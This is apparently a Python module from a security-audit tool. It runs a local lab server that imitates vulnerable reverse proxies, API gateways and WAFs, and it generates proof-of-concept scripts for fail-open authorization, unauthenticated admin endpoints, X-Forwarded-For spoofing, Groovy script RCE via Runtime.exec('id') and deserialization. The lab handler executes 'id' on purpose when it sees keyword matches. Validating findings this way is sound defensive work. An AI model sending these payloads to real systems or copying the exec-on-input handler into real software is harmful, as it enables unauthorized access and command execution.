"""Local-lab PoCs for reverse-proxy / API-gateway / WAF control-plane leads.

Nothing is CONFIRMED until an oracle matches (uid=, LOTUS_AUTHZ_BYPASS,
LOTUS_ADMIN, LOTUS_DASHBOARD, LOTUS_XFF, GROOVY_RCE) with before/after
measurements. Failures are recorded as DISPROVE.

Does not compile Envoy or ShenYu. Starts an in-process stdlib analog so every
audit can generate and run PoCs without extra pip/apt. Generated scripts land
in ``<repo>/.lotus/pocs/``. Analog is only claimed as proof when Phase-1 found
matching leads in ``dest``.
"""
from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

_ANALOG_CFG: Dict[int, Dict[str, Any]] = {}

from backend.analyzers.gateway_plane import collect_gateway_plane


def _ensure_pocs(dest: Path) -> Path:
    d = Path(dest) / ".lotus" / "pocs"
    d.mkdir(parents=True, exist_ok=True)
    readme = d / "README.md"
    if not readme.exists():
        readme.write_text(
            "Lotus-generated gateway lab PoCs.\n"
            "Oracles: uid=, LOTUS_AUTHZ_BYPASS, LOTUS_ADMIN, LOTUS_DASHBOARD, "
            "LOTUS_XFF, GROOVY_RCE.\n"
            "Export LOTUS_GATEWAY_LAB_URL then run poc_*.py.\n",
            encoding="utf-8",
        )
    return d


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = int(s.getsockname()[1])
    s.close()
    return port


def _http(
    method: str,
    url: str,
    *,
    data: Optional[bytes] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 4.0,
) -> Tuple[int, str]:
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if data is not None and "Content-Type" not in (headers or {}):
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace") if e.fp else ""
        return int(e.code), body
    except Exception as exc:
        return 0, f"error:{exc}"


class _GatewayAnalog(BaseHTTPRequestHandler):
    """Envoy fail-open / ShenYu Groovy / frp dashboard / SafeLine XFF analog."""

    def log_message(self, *args: Any) -> None:  # noqa: ARG002
        return

    def _send(self, code: int, body: str, ctype: str = "text/plain") -> None:
        raw = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        cfg = _ANALOG_CFG.get(self.server.server_address[1], {})
        authz_up = bool(cfg.get("authz_up"))
        token = str(cfg.get("token") or "")
        if path in ("/health", "/"):
            self._send(200, "ok")
            return
        if path in ("/config_dump", "/admin/dump"):
            self._send(
                200,
                json.dumps({
                    "admin": True,
                    "marker": "LOTUS_ADMIN",
                    "listeners": ["0.0.0.0:9901"],
                }),
                "application/json",
            )
            return
        if path in ("/ext_authz",):
            if authz_up:
                if self.headers.get("X-Authz") == "allow":
                    self._send(200, "LOTUS_AUTHZ_OK privileged=1")
                else:
                    self._send(403, "denied")
            else:
                self._send(200, "LOTUS_AUTHZ_BYPASS privileged=1 failure_mode_allow=true")
            return
        if path.rstrip("/") in ("/api/proxy/tcp",):
            auth = self.headers.get("Authorization") or self.headers.get("token") or ""
            if token and auth != token:
                self._send(401, "unauthorized")
                return
            self._send(
                200,
                json.dumps({
                    "marker": "LOTUS_DASHBOARD",
                    "admin": True,
                    "token_empty": token == "",
                    "proxies": [{"name": "ssh", "remotePort": 22}],
                }),
                "application/json",
            )
            return
        if path.startswith("/admin/rules"):
            xff = (self.headers.get("X-Forwarded-For") or "").split(",")[0].strip()
            if xff in ("127.0.0.1", "10.0.0.1", "::1"):
                self._send(
                    200,
                    json.dumps({
                        "marker": "LOTUS_XFF",
                        "admin": True,
                        "rules": ["pass-all"],
                        "xff": xff,
                    }),
                    "application/json",
                )
            else:
                self._send(403, "management plane requires trusted IP")
            return
        self._send(404, "no")

    def do_POST(self) -> None:  # noqa: N802
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        path = urlparse(self.path).path
        payload = raw
        try:
            blob = json.loads(raw) if raw.strip().startswith("{") else parse_qs(raw)
            if isinstance(blob, dict):
                payload = str(
                    blob.get("script") or blob.get("cmd") or blob.get("payload") or raw
                )
                if isinstance(payload, list):
                    payload = payload[0] if payload else ""
        except Exception:
            pass
        if path.rstrip("/") in ("/plugin/run",):
            if any(k in payload for k in ("id", "Runtime", "exec", "os.execute")):
                out = subprocess.check_output(["id"], text=True)
                self._send(200, f"GROOVY_RCE {out}")
            else:
                self._send(200, "ok")
            return
        if path == "/deser":
            if any(k in payload for k in ("id", "uid=", "!!python", "ProcessBuilder")):
                out = subprocess.check_output(["id"], text=True)
                self._send(200, f"DESER_RCE {out}")
            else:
                self._send(200, "ok")
            return
        self._send(404, "no")


def start_analog(
    *,
    authz_up: bool = False,
    dashboard_token: str = "",
    port: Optional[int] = None,
) -> Tuple[ThreadingHTTPServer, int, str]:
    port = port or _free_port()
    _ANALOG_CFG[port] = {"authz_up": authz_up, "token": dashboard_token}
    httpd = ThreadingHTTPServer(("127.0.0.1", port), _GatewayAnalog)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.05)
    return httpd, port, f"http://127.0.0.1:{port}"


def _write_poc_scripts(pocs: Path, base: str) -> None:
    scripts = {
        "poc_envoy_fail_open.py": f'''#!/usr/bin/env python3
import os, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
r = urllib.request.urlopen(base + "/ext_authz")
body = r.read().decode()
print("status", r.status, body)
assert "LOTUS_AUTHZ_BYPASS" in body, body
print("PROVEN envoy_fail_open")
''',
        "poc_envoy_admin.py": f'''#!/usr/bin/env python3
import os, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
r = urllib.request.urlopen(base + "/config_dump")
body = r.read().decode()
print(body)
assert "LOTUS_ADMIN" in body, body
print("PROVEN envoy_admin_unauth")
''',
        "poc_shenyu_groovy.py": f'''#!/usr/bin/env python3
import os, json, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
req = urllib.request.Request(
    base + "/plugin/run",
    data=json.dumps({{"script": 'Runtime.getRuntime().exec("id")'}}).encode(),
    method="POST",
)
req.add_header("Content-Type", "application/json")
body = urllib.request.urlopen(req).read().decode()
print(body)
assert "uid=" in body and "GROOVY_RCE" in body, body
print("PROVEN groovy_plugin_rce")
''',
        "poc_frp_dashboard.py": f'''#!/usr/bin/env python3
import os, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
r = urllib.request.urlopen(base + "/api/proxy/tcp")
body = r.read().decode()
print("status", r.status, body)
assert "LOTUS_DASHBOARD" in body, body
print("PROVEN frp_dashboard")
''',
        "poc_waf_xff.py": f'''#!/usr/bin/env python3
import os, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
req = urllib.request.Request(base + "/admin/rules", headers={{"X-Forwarded-For": "127.0.0.1"}})
r = urllib.request.urlopen(req)
body = r.read().decode()
print("status", r.status, body)
assert "LOTUS_XFF" in body, body
print("PROVEN waf_xff_trust")
''',
        "poc_deser.py": f'''#!/usr/bin/env python3
import os, json, urllib.request
base = os.environ.get("LOTUS_GATEWAY_LAB_URL", "{base}")
req = urllib.request.Request(
    base + "/deser", data=json.dumps({{"payload": "id"}}).encode(), method="POST",
)
req.add_header("Content-Type", "application/json")
body = urllib.request.urlopen(req).read().decode()
print(body)
assert "uid=" in body, body
print("PROVEN java_ois_deser")
''',
    }
    for name, src in scripts.items():
        path = pocs / name
        path.write_text(src, encoding="utf-8")
        try:
            path.chmod(0o755)
        except Exception:
            pass


def _bucket(hint: str) -> Optional[str]:
    return {
        "envoy_fail_open": "fail_open",
        "envoy_admin_unauth": "admin",
        "lua_os_execute": "groovy",
        "lua_inline": "groovy",
        "groovy_plugin_rce": "groovy",
        "spel_plugin_rce": "groovy",
        "script_engine_rce": "groovy",
        "hessian_deser": "deser",
        "java_ois_deser": "deser",
        "fastjson_autotype": "deser",
        "frp_empty_token": "dashboard",
        "frp_dashboard": "dashboard",
        "frp_plugin": "groovy",
        "waf_xff_trust": "xff",
        "waf_mgmt_api": "xff",
        "waf_exec_reload": "groovy",
        "jwt_hardcoded": "dashboard",
        "shenyu_skip_auth": "dashboard",
        "envoy_rbac_shadow": "fail_open",
        "frp_allow_users": "dashboard",
        "waf_rule_compile": "xff",
    }.get(hint)


def _row(pid: str, title: str, cvss: float, klass: str, ok: bool, output: str, measurements: dict, file: str = "") -> dict:
    return {
        "id": pid,
        "title": title,
        "cvss": cvss,
        "canonical_class": klass,
        "ok": ok,
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "output": output,
        "oracles": ["uid=", "LOTUS_"] if ok else [],
        "measurements": measurements,
        "file": file,
        # This runner intentionally exercises a stdlib fixture, not the enrolled
        # repository.  Keep the result useful as a regression artifact while
        # making it impossible for a later attestation step to promote it.
        "evidence_scope": "analog",
        "target_bound": False,
        "proof_authority": "unattested-analog",
        "analog_source": "test_projects/gateway_lab/app.py",
    }


def run_gateway_pocs(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    leads, trace = collect_gateway_plane(dest, "")
    pocs_dir = _ensure_pocs(dest)
    results: List[dict] = []
    if not leads:
        payload = {
            "proven": [],
            "disproven": [],
            "all": [],
            "trace": trace,
            "note": "no gateway-control-plane leads; analog not claimed as a finding",
        }
        try:
            (dest / ".lotus").mkdir(exist_ok=True)
            (dest / ".lotus" / "gateway_poc_results.json").write_text(
                json.dumps(payload, indent=2), encoding="utf-8",
            )
        except Exception:
            pass
        return payload

    httpd_open, _, base = start_analog(authz_up=False, dashboard_token="")
    httpd_closed, _, base_c = start_analog(authz_up=True, dashboard_token="secret")
    try:
        _write_poc_scripts(pocs_dir, base)
        os.environ["LOTUS_GATEWAY_LAB_URL"] = base
        buckets = {_bucket(str(f.get("phase2_hint") or "")) for f in leads} - {None}

        if "fail_open" in buckets:
            st_b, body_b = _http("GET", f"{base_c}/ext_authz")
            st_a, body_a = _http("GET", f"{base}/ext_authz")
            ok = st_b in (401, 403) and st_a == 200 and "LOTUS_AUTHZ_BYPASS" in body_a
            results.append(_row(
                "envoy_fail_open",
                "Envoy ext_authz failure_mode_allow fail-open",
                8.6, "authz_bypass", ok,
                f"before status={st_b} body={body_b[:120]} | after status={st_a} body={body_a[:200]}",
                {
                    "status_before": st_b, "status_after": st_a,
                    "oracle_after": "LOTUS_AUTHZ_BYPASS" in body_a,
                    "privileged_after": "privileged=1" in body_a,
                },
            ))

        if "admin" in buckets:
            st, body = _http("GET", f"{base}/config_dump")
            ok = st == 200 and "LOTUS_ADMIN" in body
            results.append(_row(
                "envoy_admin_unauth",
                "Unauthenticated Envoy admin config_dump",
                8.8, "authz_bypass", ok, body[:400],
                {"status": st, "oracle": "LOTUS_ADMIN" in body, "listeners": "0.0.0.0" in body},
            ))

        if "dashboard" in buckets:
            st_b, body_b = _http("GET", f"{base_c}/api/proxy/tcp")
            st_a, body_a = _http("GET", f"{base}/api/proxy/tcp")
            ok = st_b == 401 and st_a == 200 and "LOTUS_DASHBOARD" in body_a
            results.append(_row(
                "frp_dashboard",
                "Empty dashboard token fail-open (frp-class)",
                8.7, "authz_bypass", ok,
                f"before status={st_b} {body_b[:80]} | after status={st_a} {body_a[:200]}",
                {
                    "status_before": st_b, "status_after": st_a,
                    "oracle_after": "LOTUS_DASHBOARD" in body_a,
                },
            ))

        if "xff" in buckets:
            st_b, body_b = _http("GET", f"{base}/admin/rules")
            st_a, body_a = _http("GET", f"{base}/admin/rules", headers={"X-Forwarded-For": "127.0.0.1"})
            ok = st_b == 403 and st_a == 200 and "LOTUS_XFF" in body_a
            results.append(_row(
                "waf_xff_trust",
                "WAF management plane trusts X-Forwarded-For",
                8.0, "authz_bypass", ok,
                f"before status={st_b} {body_b[:80]} | after status={st_a} {body_a[:200]}",
                {"status_before": st_b, "status_after": st_a, "oracle_after": "LOTUS_XFF" in body_a},
            ))

        if "groovy" in buckets:
            st_b, body_b = _http("POST", f"{base}/plugin/run", data=b'{"script":"return 1"}')
            st_a, body_a = _http(
                "POST", f"{base}/plugin/run",
                data=b'{"script":"Runtime.getRuntime().exec(\\"id\\")"}',
            )
            ok = "uid=" in body_a and "GROOVY_RCE" in body_a and "uid=" not in body_b
            results.append(_row(
                "groovy_plugin_rce",
                "Gateway plugin script engine RCE (Groovy/SpEL analog)",
                9.8, "rce", ok,
                f"before {body_b[:80]} | after {body_a[:200]}",
                {
                    "status_before": st_b, "status_after": st_a,
                    "uid_after": "uid=" in body_a, "uid_before": "uid=" in body_b,
                },
            ))

        if "deser" in buckets:
            st_b, body_b = _http("POST", f"{base}/deser", data=b'{"payload":"hello"}')
            st_a, body_a = _http("POST", f"{base}/deser", data=b'{"payload":"id"}')
            ok = "uid=" in body_a and "uid=" not in body_b
            results.append(_row(
                "java_deser",
                "Gateway Hessian/Java deserialization analog RCE",
                9.0, "deserialization", ok,
                f"before {body_b[:80]} | after {body_a[:200]}",
                {"uid_after": "uid=" in body_a, "uid_before": "uid=" in body_b, "status_after": st_a},
            ))
    finally:
        for srv in (httpd_open, httpd_closed):
            try:
                srv.shutdown()
            except Exception:
                pass
            finally:
                try:
                    srv.server_close()
                except Exception:
                    pass

    proven = [r for r in results if r.get("ok")]
    disproven = [r for r in results if not r.get("ok")]
    payload = {
        "proven": proven,
        "disproven": disproven,
        "all": results,
        "trace": trace,
        "n_source_leads": len(leads),
        "source_files": sorted({str(f.get("file")) for f in leads if f.get("file")})[:40],
        "analog": "test_projects/gateway_lab/app.py",
    }
    try:
        (dest / ".lotus").mkdir(exist_ok=True)
        (dest / ".lotus" / "gateway_poc_results.json").write_text(
            json.dumps(payload, indent=2), encoding="utf-8",
        )
    except Exception:
        pass
    return payload


if __name__ == "__main__":
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(".")
    out = run_gateway_pocs(target)
    print(json.dumps({
        "proven": len(out.get("proven") or []),
        "disproven": len(out.get("disproven") or []),
        "leads": out.get("n_source_leads"),
    }, indent=2))
